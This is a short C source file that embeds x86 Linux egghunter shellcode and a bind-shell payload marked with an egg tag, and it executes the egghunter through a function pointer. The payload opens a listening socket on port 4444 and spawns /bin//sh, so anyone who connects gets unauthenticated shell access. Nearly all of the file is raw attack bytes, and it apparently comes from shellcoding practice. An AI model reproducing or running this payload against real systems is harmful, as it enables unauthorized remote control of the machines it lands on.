// Author - badbit
// Egghunter shellcode spawning a bind shell on localhost:4444 



#include <stdio.h>
#include <string.h>


char egghunter[] = "\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";


char shellcode[] = \
"\x90\x50\x90\x50"
"\x90\x50\x90\x50"
"\x31\xc0\x31\xdb\x31\xc9\xb3\x01\x51\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xc6\xb0\x66\x31\xdb\x53\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb3\x02\xcd\x80\xb0\x66\x31\xdb\x53\x56\x89\xe1\xb3\x04\xcd\x80\xb0\x66\x31\xdb\x53\x53\x56\x89\xe1\xb3\x05\xcd\x80\x89\xc3\xb9\x02\x00\x00\x00\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x89\xca\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";



int main()
{
	printf("[+] Shell bound to port 4444.\n");
	printf("[+] Original shellcode length : %d\n", strlen((char*)shellcode)-8);
	printf("[+] Length of egghunter : %d\n\n\n", strlen((char*)egghunter));

	int (*ret)() = (int(*)())egghunter;
	ret();

}
